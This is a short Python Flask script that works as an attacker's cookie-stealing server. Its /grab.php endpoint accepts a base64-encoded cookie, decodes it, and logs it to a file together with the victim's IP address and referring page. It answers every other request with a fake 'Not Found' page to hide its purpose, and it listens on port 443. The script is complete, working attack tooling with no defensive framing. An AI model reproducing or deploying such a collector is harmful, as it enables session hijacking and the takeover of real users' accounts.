from flask import Flask, request, abort
import base64

app = Flask(__name__)

@app.route('/grab.php', methods=['GET'])
def grab_cookie():
    cookie = request.args.get('cookie')
    referer = request.headers.get('Referer')  
    ip_address = request.remote_addr  
    if cookie:
        try:
            decoded_cookie = base64.b64decode(cookie).decode('utf-8')
            with open('cookies.txt', 'a') as f:
                f.write(f"IP: {ip_address} | Referer: {referer} | Cookie: {decoded_cookie}\n")

            return "The data has been saved.", 200
        except Exception as e:
            return f"Problem decoding cookie: {e}", 400
    else:
        return """
    <body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
    </body>
    """, 404

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return """
    <body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
    </body>
    """, 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443)